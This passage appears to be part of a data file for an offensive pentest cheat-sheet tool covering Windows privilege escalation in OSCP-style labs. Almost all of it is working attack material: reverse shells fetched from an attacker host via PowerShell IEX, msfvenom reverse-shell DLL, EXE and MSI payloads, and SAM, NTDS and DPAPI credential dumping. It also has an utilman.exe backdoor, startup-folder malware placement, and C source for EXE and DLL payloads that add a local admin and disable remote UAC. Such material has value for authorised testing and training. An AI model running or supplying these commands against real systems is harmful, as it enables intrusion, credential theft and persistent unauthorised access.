wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# 2. execute JuicyPotato with the command you want to run as SYSTEM
# reference for correct clsid: https://ohpe.it/juicy-potato/CLSID/
.\\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "c:\\windows\\system32\\cmd.exe" -a "/c powershell IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}" -t *`,
                code_language: powershell,
            },
            {
                title: "SeBackupPrivilege",
                description: "Check if the tokens you currently have, can be used to escalate privileges",
                code: `# 1. check your group & user tokens
whoami /priv

# 2. compare (enabled and disabled) tokens to the following github URL.
# https://github.com/gtworek/Priv2Admin

##### 2. SeBackupPrivilege
# reference : https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
# reference for dumping AD hashes : https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

##### OPTION 1: DUMP SAM hashes
# 1. Create a temp directory
mkdir C:\\temp

# 2. Copy the sam and system hive of HKLM to C:\\windows\\temp and then download them 
# NOTE : The hives are different then the plaintext SAM/SYSTEM file

reg save hklm\\sam C:\\windows\\temp\\sam.hive
reg save hklm\\system C:\\windows\\temp\\system.hive

# 3.
# Download to attacking machine..

# 4. Dump the NTLM hashes from the SAM && SYSTEM hive file
secretsdump.py -sam sam.hive -system system.hive LOCAL

##### OPTION 2: copy the entire 'administrators' directory to a temp directory, and then download it
# reference: https://github.com/k4sth4/SeBackupPrivilege
robocopy /b C:\\users\\administrator\\desktop C:\\Windows\\temp\\test

##### OPTION 3: DUMP SAM and LSA secrets (machine accounts)
# 1. save the SECURITY and SAM hives from HKLM to C:\\windows\\temp
reg save hklm\\sam C:\\windows\\temp\\sam.hive
reg save hklm\\security C:\\windows\\temp\\security.hive

# 2. download the SAM and SECURITY hives to your attacking machine and dump the hashes
secretsdump.py -security security.hive -system system.hive LOCAL

##### OPTION 4: DUMP AD user hashes (domain accounts) - see the reference
# 1. create a script named 'script.txt' that can be used by 'diskshadow' (attacker machine)
"""
set verbose on
set metadata C:\\Windows\\Temp\\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
"""

# 2. use unix2dos to convert it to dos format (attacker machine), then upload it to the target machine
unix2dos script.txt

# 3. run diskshadow with the script you just created (target machine)
diskshadow /s script.txt

# 4. copy the ntds.dit and SYSTEM file to a temp directory (target machine)
robocopy /b E:\\Windows\\ntds . ntds.dit
robocopy /b E:\\Windows\\System32\\config system SYSTEM

# 5. download the ntds.dit and SYSTEM file to your attacking machine
...

# step 6. dump the AD user hashes from the ntds.dit && SYSTEM hive file (attacker machine)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`,
                code_language: powershell
            },
            {
                title: "SeRestorePrivilege",
                description: "Escalate privileges with 'SeRestorePrivilege'",
                code: `# 1. check your group & user tokens
whoami /priv

# 2. compare (enabled and disabled) tokens to the following github URL.
# https://github.com/gtworek/Priv2Admin

##### 2. SeRestorePrivilege
# reference   : (original) https://github.com/xct/SeRestoreAbuse
# useful fork : https://github.com/N1et/SeRestoreAbuseWithRevShell
# hacktricks  : https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html

# TIP:
# SeRestorePrivilege allows a user to write to any file, regardless of the ACL on the file (ONLY works with 'move', not with 'copy')

##### OPTION 1: Utilizing 'SeRestoreAbuse.exe'
# 1. Download the pre-compiled .exe from https://github.com/N1et/SeRestoreAbuseWithRevShell/tree/main/x64/Release
....

# 2. Upload the .exe file to target machine and setup a listener on the attacker machine
rlwrap nc -lvnp {{LPORT}}

# 3. Execute the payload on the target machine
.\\SeRestoreAbuse.exe -revshell {{LHOST}}:{{LPORT}}

##### OPTION 2: Utilizing 'utilman.exe' and 'cmd.exe' (requires RDP session)
# 1. Rename 'utilman.exe' to 'utilman.old' & rename 'cmd.exe' to 'utilman.exe' (victim machine)
move C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman.old
move C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe

# 2. Login from your attacker machine using RDP on the victim machine
rdesktop {{RHOST}}

# 3. When at the login screen, press 'Windows key + U' to open a command prompt with SYSTEM privileges
...
`,
                code_language: powershell
            },
            {
                title: "SeManageVolumePrivilege",
                description: "Abuse the SeManageVolumePrivilege to escalate privileges",
                code: `# 1. check your group & user tokens
whoami /priv

# 2. compare (enabled and disabled) tokens to the following github URL.
# https://github.com/gtworek/Priv2Admin

##### SeManageVolumePrivilege:
# https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f
# https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d

##### START EXPLOITATION
# 1. Retrieve the following exploit
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# 2. execute the exploit on the target host where you have the SeManageVolumePrivilege enabled
SeManageVolumeExploit.exe

# 3. generate a malicious .dll file and upload it to the target host
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f dll -o tzres.dll

# 4. upload tzres.dll to the target host, and copy it in the 'wbem' directory
copy tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll

# 5. create a listener
create a listener (e.g. : rlwrap nc -lvnp {{LPORT}})

# 6. execute the exploit by invoking 'systeminfo'
systeminfo

##### ALTERNATIVE METHODS TO EXECUTE THE EXPLOIT #####
# https://github.com/Daniel-Ayz/OSCP

# 1. repeat step 1 to 3 from above, but name the file 'Printconfig.dll' instead of 'tzres.dll'

# 2. upload Printconfig.dll to the target host, and copy it to the target directory
copy Printconfig.dll C:\\Windows\\System32\\spool\\drivers\\x64\\3\\

# press Yes
# 3. setup a listener
rlwrap nc -lvnp {{LPORT}}

# 4. on the target - run the trigger to execute the exploit
powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)

# 5. You should now have a shell as NT AUTHORITY\\SYSTEM

##### Alternative: using the WER method: https://github.com/sailay1996/WerTrigger/tree/master

##### END EXPLOITATION`,
                code_language: powershell
            },
            {
                title: "SeLoadDriverPrivilege (TODO)",
                description: "Abuse the SeLoadDriverPrivilege to escalate privileges",
                code: `##### REQUIREMENTS:
<...>

TODO!
##### REFERENCE:
# https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege
# https://github.com/JoshMorrison99/SeLoadDriverPrivilege

##### START EXPLOITATION
<...>

##### END EXPLOITATION`,
                code_language: powershell
            },
            {
                title: "low-privileged service account",
                description: "Upgrade the privileges of a low-privileged service account",
                code: `##### REQUIREMENTS:
# You have access to a low-privileged service account

##### EXPLANATION:
# It is possible to upgrade the privileges of a low-privileged service account to a higher privileged account by utilizing 'FullPowers.exe' 
    
##### REFERENCE:
- https://github.com/itm4n/FullPowers

##### START EXPLOITATION

# 1. view newly gained privileges
./FullPowers.exe -c 'whoami /priv'

# 2. execute a reverse shell as a user with more privileges
./FullPowers.exe -c 'powershell IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}'

##### END EXPLOITATION`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "6. Escalation path: Privileged groups",
        checks: [
            {
                title: "Server Operators",
                description: "Abuse the Server Operators group to escalate privileges",
                code: `##### REQUIREMENTS:
# you are part of the 'Server Operators' group

##### EXPLANATION:
# This membership allows users to configure Domain Controllers with the following privileges: (https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#server-operators)

# Allow log on locally
# Back up files and directories
# Change the system time
# Change the time zone
# Force shutdown from a remote system
# Restore files and directories
# Shut down the system
    
##### REFERENCE:
- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- https://adminions.ca/books/windows-attacks-and-enumerations/page/windows-local-privilege-escalation

##### START EXPLOITATION
# 1: setup a listener (Attacker machine)
rlwrap nc -lvnp {{LPORT}}

# 2. generate a reverse shell, then upload a shell to the target machine (.exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > reverse.exe
upload reverse.exe

# 3. Update the 'binpath' of the service 'vss' to the path of the shell you just uploaded (target machine)
sc.exe config vss binPath="C:\\Path\\reverse.exe"

# 4. Stop the service 'vss' (target machine)
sc.exe stop vss

# 5. Start the service 'vss' to execute the shell with SYSTEM privileges (target machine)
sc.exe start vss

##### END EXPLOITATION`,
                code_language: bash,
            },
            {
                title: "Backup Operators (remote)",
                description: "Abuse the Backup Operators group to escalate privileges",
                code: `##### REQUIREMENTS:
# you are part of the 'Backup Operators' group (only tested within an AD environment)

##### EXPLANATION:
# this membership allows users to remotely interact with a service, dump the SAM, SYSTEM and SECURITY file, and possibly extract the ntds.dit file
    
##### REFERENCE:
# - https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets

##### START EXPLOITATION

# 1. dump the SAM, SYTEM and SECURITY registry of a windows host, and save it to the sysvol share
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SAM' -o '\\\\{{RHOST}}\\SYSVOL\\'
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SYSTEM' -o '\\\\{{RHOST}}\\SYSVOL\\'
reg.py '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}':'{{PASSWORD}}'@{{RHOST}} save -keyName 'HKLM\\SECURITY' -o '\\\\{{RHOST}}\\SYSVOL\\'

# 2. download the SAM, SYSTEM and SECURITY registry hives to your attacking machine
...

# 3. dump the hashes using secretsdump.py
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# 4. remotely dump the ntds.dit file, utilizing the machine account (or administrator account)
secretsdump.py -hashes '{{HASH}}' '{{DOMAIN}}'.'{{ROOTDNS}}'/'{{USERNAME}}'\@{{RHOST}}

###
# --- alternative using the machine account --- #
###
secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee:0553a08c0df714d3fa0d681e25640909' 'medtech'.'com'/'DC01\$'@192.168.42.10

##### END EXPLOITATION`,
                code_language: bash,
            },
            {
                title: "UAC Elevation via RDP",
                description: "Elevate to full token privileges via 'Run as administrator'",
                code: `##### REQUIREMENTS:
# You are part of a privileged group (e.g., Backup Operators, Server Operators, DnsAdmins)
# You have RDP access to the target machine

##### EXPLANATION:
# When users in privileged groups log in, UAC creates two tokens:
# - Filtered token (default): Dangerous privileges are stripped
# - Full token (locked): All group privileges are present
#
# "Run as administrator" with your OWN credentials unlocks the full token.
# This reveals privileges like SeBackupPrivilege, SeRestorePrivilege, etc.

##### REFERENCE:
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges

##### START EXPLOITATION
# 1. RDP into the target machine
xfreerdp3 /v:'{{RHOST}}' /u:'{{USERNAME}}' /p:'{{PASSWORD}}'

# 2. Open CMD/PowerShell as administrator (enter YOUR OWN credentials at UAC prompt)
# Right-click CMD/PowerShell > "Run as administrator" > Enter {{USERNAME}} & {{PASSWORD}}

# 3. Verify your elevated privileges (target machine)
whoami /priv

# 4. Continue exploitation based on available privileges:
# - SeBackupPrivilege    → Dump SAM/SYSTEM, extract hashes
# - SeRestorePrivilege   → Overwrite system files, DLL hijacking
# - SeLoadDriverPrivilege → Load malicious drivers

##### END EXPLOITATION`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "7. Escalation path: Stored credentials / AD-objects",
        checks: [
            {
                title: "cmdkey /list & runas.exe",
                description: "Using the credentials obtained from cmdkey /list, execute commands under that users identity.",
                code: `# 1. Check if there are any credentials saved
cmdkey /list

# 2. If so, impersonate and execute commands under that user
# '/savecred' tells to impersonate the user 'ACCESS\\Administrator'
C:\\Windows\\System32\\runas.exe /savecred /user:ACCESS\\Administrator "C:\\Windows\\System32\\cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}"`,
                code_language: powershell,
            },
            {
                title: "Check for saved credentials",
                description: "Check for valid credentials in the 'Credentials' directory of the current user",
                code_language: "language-powershell",
                code: `##### REQUIREMENTS:
# A. SID of the user
# B. Password of the user
# C. Masterkey file (from AppData\Roaming\Microsoft\Protect\<USER_SID>\<MASTERKEY_GUID>)
# D. Credential file (from AppData\Roaming\Microsoft\Credentials\<CRED_FILE>)

##### OPTION 1: extract creds using dpapi.py to extract credentials from DPAPI files
# reference: 
https://0xdf.gitlab.io/2025/11/01/htb-voleur.html#

# 1. retrieve the masterkey (save it for command 2)
dpapi.py masterkey -file <MASTER_KEY_FILE> -sid <USER_SID> -password <USER_PASSWORD>

# 2. retrieve the credentials
dpapi.py credential -file <CRED_FILE> -key <MASTERKEY_PASSWORD_HEX>

##### Example: (voleur.htb) - home directory of user 'todd.wolfe'
# 1. retrieve the masterkey (save it for command 2)
dpapi.py masterkey -file AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

# 2. retrieve the credentials
dpapi.py credential -file AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
`
            },
            {
                title: "Check the recyclebin",
                description: "Check the recyclebin for stored credentials / AD-objects",
                code_language: "language-powershell",
                code: `# 1. Check the recyclebin for stored credentials / AD-objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

# list a specific deleted object (e.g. 'todd.wolfe' from voleur.htb)
Get-ADObject -Filter "samaccountname -like 'todd.wolfe'" -IncludeDeletedObjects
                
# 2. If any useful objects are found, restore them
Get-ADObject -Filter "samaccountname -like 'todd.wolfe'" -IncludeDeletedObjects | Restore-ADObject          `
            },
        ]
    },
    {
        chapter: "8. Escalation path: Registry",
        checks: [
            {
                title: "Autorun - Modifable registry autoruns",
                description: "Check for modifable registry autoruns and configs",
                code: `# Check for modifable registry autoruns and configs
# autoruns are tasks that normally start when a user logs in or drives get attached

# 1. Download PowerUp.ps1 and load it into memory
powershell -ep bypass
. .\\PowerUp.ps1

# 2. Invoke-AllChecks
Invoke-AllChecks

# 3. if the section 'Checking for modifable registry autoruns and configs...' has a program specified (after running PowerUp.ps1), check the permissions on the specified file and replace it by the file that you want to execute (e.g. reverse shell)`,
                code_language: powershell,
            },
            {
                title: "Search for passwords in the registry",
                description: "Search for passwords in the registry",
                code: `# Retrieves the encrypted VNC password stored in the registry
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"

# Checks registry keys for auto-login credentials on Windows
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"

# Fetches SNMP service configuration details
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"

# Lists saved sessions and configuration for PuTTY
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"

# Searches for any registry entries labeled 'password' with a string type in HKLM
reg query HKLM /f password /t REG_SZ /s

# Searches for any registry entries labeled 'password' with a string type in HKCU
reg query HKCU /f password /t REG_SZ /s`,
                code_language: powershell,
            },
            {
                title: "Abusing 'AlwaysInstallElevated' privilege",
                description: "Abuse the 'AlwaysInstallElevated' option, which installs .msi files as an privileged user",
                code: `##### OPTION 1: manual confirmation
##### IMPORTANT: executing the .msi file may result in buggy executions of '.msi' files (Shenzi - Offsec proving grounds). Make sure you execute a .msi file once and correctly

# 1. execute the following registry queries             
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer

# 2. look for the returned value. If this is '0x1' (1) for both queries, you have elevated privileges and you can install .msi files as an privileged user

# 3. 
# OPTION 1: generate a reverse shell with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f msi -o rev-{{LPORT}}.msi

# OPTION 2: create a user 'rottenadmin' and add the user to the admin group
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

# 4. Upload the .msi file to the target machine and execute it # MAKE 100% SURE YOUR PAYLOAD IS CORRECT
# OPTION 1: execute it directly (verified) 
.\\rev-{{LPORT}}.msi # (worked on shenzi - offsec)
.\\alwe.msi

# OPTION 2: Utilize msiexec to execute the payload
msiexec /quiet /qn /i rev-{{LPORT}}.msi
msiexec /quiet /qn /i alwe.msi

# msiexec options are
# /quiet : quiet mode, this means suppress any messages to the user while installing
# /qn : specifies no GUI
# /i : specifies normal installation

##### OPTION 2: Abusing the 'alwaysInstallElevated' registry, installs .msi files as an privileged user, which could result in a privileged shell
## option 1: execute PowerUp.ps1
# 1. execute Invoke-AllChecks
Invoke-AllChecks

# 2. Look for the section 'Checking for modifidable registry autoruns and configs...', if there are results here, chances are big you can create an .msi reverse shell (msfvenom)`,
                code_language: powershell,
            },
            {
                title: "privesc through 'regsvc' registry key",
                description: "escalate privileges through 'regsvc' registry key",
                code: `# 1. Check the permissions on the 'regsvc' registry key:
Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | Format-List

# 2. Review the output. If any low-privileged user groups you are part of have FullControl (e.g., NT AUTHORITY\\INTERACTIVE),
#    proceed with creating or modifying the registry service entry.

# 3. Create or update the 'regsvc' registry service with a specified windows service executable (compile the 'windows_service.c' with the .sh file (add shell commands in the windows_service.c file beforehand) - https://github.com/michel-this-mountain/pentest-resources/tree/main/general/privesc/windows/registry_service)
#    copy the executable to the victim machine (x.exe) and add it as the 'regsvc' service
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f

# 4. start the service (in 'https://tryhackme.com/r/room/windowsprivescarena' only worked from cmd.exe)
sc start regsvc

# 5. reset the 'regsvc' registry key
reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d "" /f`,
                code_language: powershell,
            },
        ]
    },
    {
        chapter: "9. Escalation path: startup applications",
        checks: [
            {
                title: "Add a Malicious Startup Application",
                description: "Add a startup application that executes automatically when the user logs in.",
                code: `## add a malicious startup application that executes automatically when the user logs in.

# 1. Execute the following command to check the permissions
icacls.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

# 2. if you have Full control or write access, add a malicious file to this location
copy "C:\\Path\\to\\malicious.exe" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

## or when you cannot copy to the 'c:\\ProgramData' folder due to administrative restrictions (copying to the ProgramData folder requires admin privileges in some cases)
certutil -encode shell.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shell.hex"
certutil -decode "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shell.hex" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shell.exe"

# 3. wait for an privileged user to login and catch the shell on your listener

###
# - view all startup applications
###
if(!(Get-PSDrive HKU -ErrorAction SilentlyContinue)){New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null}; $locs=@("HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"); Get-ChildItem HKU:\\ -ErrorAction SilentlyContinue | ForEach-Object { $locs+="HKU:\\$($_.PSChildName)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; $locs+="HKU:\\$($_.PSChildName)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" }; $locs | ForEach-Object { $loc=$_; if(Test-Path $loc){ $props=Get-ItemProperty $loc; $props.PSObject.Properties | Where-Object {$_.Name -notmatch '^PS'} | ForEach-Object { [PSCustomObject]@{Name=$_.Name; Command=$_.Value; Location=$loc} }}}; $folders=@("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"); Get-ChildItem "C:\\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $folders+="$($_.FullName)\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" }; $folders | ForEach-Object { Get-ChildItem $_ -Force -ErrorAction SilentlyContinue | Where-Object {$_.Name -ne 'desktop.ini'} | ForEach-Object { [PSCustomObject]@{Name=$_.BaseName; Command=$_.FullName; Location="Startup"} }}`,
            },
        ]
    },
    {
        chapter: "10. Payloads + quicksearch flags",
        checks: [
            {
                title: "create a new local admin user & disable remote UAC",
                description: "create a new local admin user & disable remote UAC - 1 liner",
                code: `# 1. create a new local admin user & disable remote UAC - 1 liner
net user "tempUserG" "DiffPword951" /add ; net localgroup Administrators "tempUserG" /add ; reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`,
                code_language: powershell,
            },
            {
                title: "64-bit '.exe' : Create a new local admin user & disable remote UAC",
                description: "",
                code: `# COMPILE COMMAND:
x86_64-w64-mingw32-gcc payload.c -o payload.exe

### --- START PAYLOAD --- ###
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user tempUserG DiffPword951 /add");
  i = system ("net localgroup Administrators tempUserG /add");
  i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
  
  return 0;
}
### --- END PAYLOAD --- ###`,
                code_language: powershell,
            },
            {
                title: "64-bit '.dll' Create a new local admin user & disable remote UAC",
                description: "",
                code: `# COMPILE COMMAND:
x86_64-w64-mingw32-gcc dll.cpp --shared -o output.dll

### - start DLL payload - ###

#include <windows.h>
 
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        
        int i;
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_THREAD_DETACH: // A thread exits normally.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
        
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        
        i = system ("net user tempUserG DiffPword951 /add");
        i = system ("net localgroup Administrators tempUserG /add");
        i = system ("reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
        break;
    }
    return TRUE;
}

### - end DLL payload - ###`,
                code_language: powershell,
            },
            {
                title: "search for the file 'local.txt' and 'proof.txt'",
                description: "",
                code: `# 1. search for the files 'local.txt' and 'proof.txt'
Get-ChildItem -Path C:\\ -Include "local.txt", "proof.txt" -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "\`n[+] $($_.FullName)"; type $_.FullName }

# 2. OSCP manner (to be tested)
Get-ChildItem -Path C:\\ -Include "local.txt", "proof.txt" -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "type $($_.FullName) && whoami && ipconfig" }`,
                code_language: powershell,
            },
        ]
    }
]